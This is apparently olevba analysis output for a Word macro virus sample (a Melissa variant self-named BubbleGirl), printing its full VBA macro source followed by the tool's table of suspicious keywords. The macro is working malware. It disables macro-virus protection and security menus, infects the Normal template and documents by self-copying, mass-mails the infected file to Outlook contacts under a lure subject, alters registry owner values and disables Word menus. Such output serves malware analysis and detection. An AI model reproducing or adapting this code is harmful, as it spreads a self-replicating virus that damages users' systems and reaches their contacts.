olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Melissa.bk
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO BubbleGirl.cls 
in file: ./Virus.MSWord.Melissa.bk - OLE stream: 'Macros/VBA/BubbleGirl'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Close()
On Error Resume Next
If System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") <> "" Then
CommandBars("Macro").Controls("Security...").Enabled = False
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") = 1&
Else
CommandBars("Tools").Controls("Macro").Enabled = False
Options.ConfirmConversions = (1 - 1): Options.VirusProtection = (1 - 1): Options.SaveNormalPrompt = (1 - 1)
End If
x9 = Now()
x7 = Day(x9)
x8 = Month(x9)
    If x7 >= 24 And x8 = 12 Then
    x10 = MsgBox("I wish you a Merry X-mas!! Do you love me ?", vbYesNo)
    If x10 = vbYes Then
    MsgBox "Thank You! I Love You. You are so cute."
    Else
    MsgBox " You are so rude." & vbCrLf & "Fuck you, Asshole!", vbCritical
    Dim UngaDasOutlook, DasMapiName, BreakUmOffASlice
    Set UngaDasOutlook = CreateObject("Outlook.Application")
    Set DasMapiName = UngaDasOutlook.GetNameSpace("MAPI")
    If System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\", "MelissAyman?") <> "... by Ayman" Then
     If UngaDasOutlook = "Outlook" Then
     DasMapiName.Logon "profile", "password"
         For y = 1 To DasMapiName.AddressLists.Count
             Set AddyBook = DasMapiName.AddressLists(y)
             x = 1
             Set BreakUmOffASlice = UngaDasOutlook.CreateItem(0)
             For oo = 1 To AddyBook.AddressEntries.Count
                 Peep = AddyBook.AddressEntries(x)
                 BreakUmOffASlice.Recipients.Add Peep
                 x = x + 1
                 If x > 15 Then oo = AddyBook.AddressEntries.Count
             Next oo
             BreakUmOffASlice.Subject = "An important advice from " & Application.UserName
             BreakUmOffASlice.Body = "Take a look in this Document, urgent suggestions to be a cool man!! ;-)"
             BreakUmOffASlice.Attachments.Add ActiveDocument.FullName
             BreakUmOffASlice.Send
             Peep = ""
         Next y
     DasMapiName.Logoff
     End If
     System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\", "MelissAyman?") = "... by Ayman"
     End If
    End If
    If x7 = 1 And x8 = 1 Then
    MsgBox "Happy New Year!!", vbOK
    End If
    If x7 >= 28 And x8 = 2 Then
    MsgBox "It's Kouki's Birthday!", vbOK
    End If
End If
Set ADI1 = ActiveDocument.VBProject.VBComponents.Item(1)
Set NTI1 = NormalTemplate.VBProject.VBComponents.Item(1)
NTCL = NTI1.CodeModule.CountOfLines
ADCL = ADI1.CodeModule.CountOfLines
BGN = 2
If ADI1.Name <> "BubbleGirl" Then
If ADCL > 0 Then _
ADI1.CodeModule.DeleteLines 1, ADCL
Set ToInfect = ADI1
ADI1.Name = "BubbleGirl"
DoAD = True
End If
If NTI1.Name <> "BubbleGirl" Then
If NTCL > 0 Then _
NTI1.CodeModule.DeleteLines 1, NTCL
Set ToInfect = NTI1
NTI1.Name = "BubbleGirl"
DoNT = True
End If
If DoNT <> True And DoAD <> True Then GoTo CYA
If DoNT = True Then
Do While ADI1.CodeModule.Lines(1, 1) = ""
ADI1.CodeModule.DeleteLines 1
Loop
ToInfect.CodeModule.AddFromString ("Private Sub Document_Close()")
Do While ADI1.CodeModule.Lines(BGN, 1) <> ""
ToInfect.CodeModule.InsertLines BGN, ADI1.CodeModule.Lines(BGN, 1)
BGN = BGN + 1
Loop
End If
If DoAD = True Then
Do While NTI1.CodeModule.Lines(1, 1) = ""
NTI1.CodeModule.DeleteLines 1
Loop
ToInfect.CodeModule.AddFromString ("Private Sub Document_Close()")
Do While NTI1.CodeModule.Lines(BGN, 1) <> ""
ToInfect.CodeModule.InsertLines BGN, NTI1.CodeModule.Lines(BGN, 1)
BGN = BGN + 1
Loop
End If
CYA:
If NTCL <> 0 And ADCL = 0 And (InStr(1, ActiveDocument.Name, "Document") = False) Then
ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
ElseIf (InStr(1, ActiveDocument.Name, "Document") <> False) Then
ActiveDocument.Saved = True: End If
End Sub
Private Sub Document_Open()
On Error Resume Next
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion", "RegisteredOwner") = "BubbleGirl"
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion", "RegisteredOrganization") = "BubbleFamily"
CommandBars("Tools").Controls("Options...").Enabled = False
CommandBars("File").Controls("Print...").Enabled = False
CommandBars("File").Controls("Save As...").Enabled = False
CommandBars("File").Controls("Properties").Enabled = False
CommandBars("Tools").Controls("Customize...").Enabled = False
CommandBars("Format").Controls("Paragraph...").Enabled = False
CommandBars("File").Controls("New...").Enabled = False
CommandBars("File").Enabled = False
CommandBars("Edit").Enabled = False
CommandBars("View").Enabled = False
CommandBars("Insert").Enabled = False
CommandBars("Format").Enabled = False
CommandBars("Tools").Enabled = False
CommandBars("Table").Enabled = False
CommandBars("Window").Enabled = False
CommandBars("Help").Enabled = False
If System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\8.0\Word\Options", "EnableMacroVirusProtection") <> "" Then
CommandBars("Tools").Controls("Macro").Enabled = False
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\8.0\Word\Options", "EnableMacroVirusProtection") = ""
Else
   If System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") <> "" Then
   CommandBars("Macro").Controls("Security...").Enabled = False
   System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") = ""
   End If
End If
Set ADI1 = ActiveDocument.VBProject.VBComponents.Item(1)
Set NTI1 = NormalTemplate.VBProject.VBComponents.Item(1)
NTCL = NTI1.CodeModule.CountOfLines
ADCL = ADI1.CodeModule.CountOfLines
BGN = 2
If ADI1.Name <> "BubbleGirl" Then
If ADCL > 0 Then _
ADI1.CodeModule.DeleteLines 1, ADCL
Set ToInfect = ADI1
ADI1.Name = "BubbleGirl"
DoAD = True
End If
If NTI1.Name <> "BubbleGirl" Then
If NTCL > 0 Then _
NTI1.CodeModule.DeleteLines 1, NTCL
Set ToInfect = NTI1
NTI1.Name = "BubbleGirl"
DoNT = True
End If
If DoNT <> True And DoAD <> True Then GoTo CYA
If DoNT = True Then
Do While ADI1.CodeModule.Lines(1, 1) = ""
ADI1.CodeModule.DeleteLines 1
Loop
ToInfect.CodeModule.AddFromString ("Private Sub Document_Close()")
Do While ADI1.CodeModule.Lines(BGN, 1) <> ""
ToInfect.CodeModule.InsertLines BGN, ADI1.CodeModule.Lines(BGN, 1)
BGN = BGN + 1
Loop
End If
If DoAD = True Then
Do While NTI1.CodeModule.Lines(1, 1) = ""
NTI1.CodeModule.DeleteLines 1
Loop
ToInfect.CodeModule.AddFromString ("Private Sub Document_Close()")
Do While NTI1.CodeModule.Lines(BGN, 1) <> ""
ToInfect.CodeModule.InsertLines BGN, NTI1.CodeModule.Lines(BGN, 1)
BGN = BGN + 1
Loop
End If
CYA:
If NTCL <> 0 And ADCL = 0 And (InStr(1, ActiveDocument.Name, "Document") = False) Then
ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
ElseIf (InStr(1, ActiveDocument.Name, "Document") <> False) Then
ActiveDocument.Saved = True: End If
' Word/BubbleGirl written by m0nk3y-A Hacker
' BubbleGirl isn't sister of Bubbleboy!
' Wait for BubbleFamily soon.
' Newbies can do something too.
End Sub

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

